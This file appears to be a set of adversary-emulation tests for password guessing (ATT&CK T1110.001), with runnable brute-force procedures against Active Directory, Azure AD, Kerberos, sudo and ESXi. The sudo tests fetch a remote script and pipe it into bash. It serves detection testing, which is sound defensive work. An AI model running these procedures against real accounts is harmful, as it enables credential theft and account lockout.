{
  "attack_technique": "T1110.001",
  "display_name": "Brute Force: Password Guessing",
  "atomic_tests": [
    {
      "name": "Brute Force Credentials of single Active Directory domain users via SMB",
      "description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": false,
        "procedure": "echo Password1> passwords.txt\necho 1q2w3e4r>> passwords.txt\necho Password!>> passwords.txt\necho Spring2022>> passwords.txt\necho ChangeMe!>> passwords.txt\n@FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\#{user}\" \"%p\" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\\IPC$ > NUL"
      },
      "input_arguments": [
        {
          "arg_name": "user",
          "description": "Account to bruteforce",
          "type": "string",
          "default": "%username%"
        }
      ],
      "auto_generated_guid": "09480053-2f98-4854-be6e-71ae5f672224"
    },
    {
      "name": "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)",
      "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$passwordList = Get-Content -Path \"#{passwords_path}\"\nforeach ($password in $passwordList){\n  $credz = new-object System.Net.NetworkCredential(\"#{user}\", $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of bruteforce\""
      },
      "input_arguments": [
        {
          "arg_name": "user",
          "description": "Account to bruteforce",
          "type": "string",
          "default": "$ENV:USERNAME"
        },
        {
          "arg_name": "passwords_path",
          "description": "List of passwords we will attempt to brute force with",
          "type": "path",
          "default": "PathToAtomicsFolder\\T1110.001\\src\\passwords.txt"
        },
        {
          "arg_name": "domain",
          "description": "Active Directory domain FQDN",
          "type": "string",
          "default": "$env:UserDnsDomain"
        },
        {
          "arg_name": "auth",
          "description": "authentication method to choose between \"NTLM\" and \"Kerberos\"",
          "type": "string",
          "default": "NTLM"
        }
      ],
      "auto_generated_guid": "c2969434-672b-4ec8-8df0-bbb91f40e250"
    },
    {
      "name": "Brute Force Credentials of single Azure AD user",
      "description": "Attempt to brute force Azure AD user via AzureAD powershell module.",
      "supported_platforms": [
        "azure-ad"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "Import-Module -Name AzureAD\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{username}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{username}:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] #{username}:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\""
      },
      "input_arguments": [
        {
          "arg_name": "username",
          "description": "Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg \"bruce.wayne@<valid_ms_account.com>\"",
          "type": "string",
          "default": "bruce.wayne@contoso.com"
        },
        {
          "arg_name": "passwords",
          "description": "List of passwords we will attempt to brute force with",
          "type": "string",
          "default": "Password1`n1q2w3e4r`nPassword!"
        }
      ],
      "dependencies": [
        {
          "description": "AzureAD module must be installed.",
          "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
          "get_prereq_command": "Install-Module -Name AzureAD -Force"
        }
      ],
      "auto_generated_guid": "5a51ef57-299e-4d62-8e11-2d440df55e69"
    },
    {
      "name": "Password Brute User using Kerbrute Tool",
      "description": "Bruteforce a single user's password from a wordlist",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\\bruteuser.txt TestUser1"
      },
      "input_arguments": [
        {
          "arg_name": "domaincontroller",
          "description": "Domain controller where test will be run",
          "type": "string",
          "default": "$ENV:userdnsdomain"
        },
        {
          "arg_name": "domain",
          "description": "Domain where you will be testing",
          "type": "string",
          "default": "$ENV:userdomain"
        }
      ],
      "dependencies": [
        {
          "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads",
          "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\""
        },
        {
          "description": "bruteuser.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads",
          "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteuser.txt\"){exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteuser.txt\""
        }
      ],
      "auto_generated_guid": "59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4"
    },
    {
      "name": "SUDO Brute Force - Debian",
      "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": true,
        "cleanup_command": "userdel -fr art",
        "procedure": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu -c \"cd /tmp; curl -s #{remote_url} | bash\" art"
      },
      "input_arguments": [
        {
          "arg_name": "remote_url",
          "description": "url of remote payload",
          "type": "url",
          "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
        }
      ],
      "dependencies": [
        {
          "description": "Check if running on a Debian based machine.",
          "prereq_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi",
          "get_prereq_command": "apt update && apt install -y openssl sudo curl"
        }
      ],
      "auto_generated_guid": "ba1bf0b6-f32b-4db0-b7cc-d78cacc76700"
    },
    {
      "name": "SUDO Brute Force - Redhat",
      "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": true,
        "cleanup_command": "userdel -fr art",
        "procedure": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash"
      },
      "input_arguments": [
        {
          "arg_name": "remote_url",
          "description": "url of remote payload",
          "type": "url",
          "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
        }
      ],
      "dependencies": [
        {
          "description": "Check if running on a Redhat based machine.",
          "prereq_command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi",
          "get_prereq_command": "yum update && yum install -y openssl sudo curl"
        }
      ],
      "auto_generated_guid": "4097bc00-5eeb-4d56-aaf9-287d60351d95"
    },
    {
      "name": "SUDO Brute Force - FreeBSD",
      "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": true,
        "cleanup_command": "rmuser -y art",
        "procedure": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash"
      },
      "input_arguments": [
        {
          "arg_name": "remote_url",
          "description": "url of remote payload",
          "type": "url",
          "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
        }
      ],
      "dependencies": [
        {
          "description": "Check if running on a FreeBSD based machine.",
          "prereq_command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi",
          "get_prereq_command": "pkg update && pkg install -y sudo curl bash"
        }
      ],
      "dependency_executor_name": "sh",
      "auto_generated_guid": "abcde488-e083-4ee7-bc85-a5684edd7541"
    },
    {
      "name": "ESXi - Brute Force Until Account Lockout",
      "description": "An adversary may attempt to brute force the password of privilleged account for privilege escalation.\nIn the process, the TA may lock the account, which can be used for detection. [Reference](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/#:~:text=A%20ransomware%20group%20attacking%20large,internal%20systems%20after%20establishing%20a)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "$lockout_threshold = [int]\"#{lockout_threshold}\"\nfor ($var = 1; $var -le $lockout_threshold; $var++) {\n  #{plink_file} -ssh \"#{vm_host}\" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002\n  }"
      },
      "input_arguments": [
        {
          "arg_name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default": "atomic.local"
        },
        {
          "arg_name": "plink_file",
          "description": "Path to Putty",
          "type": "path",
          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
        },
        {
          "arg_name": "lockout_threshold",
          "description": "Specify the account lockout threshold configured on the ESXI management server",
          "type": "string",
          "default": "5"
        }
      ],
      "dependencies": [
        {
          "description": "The plink executable must be found in the ExternalPayloads folder.",
          "prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\""
        }
      ],
      "auto_generated_guid": "ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5"
    }
  ]
}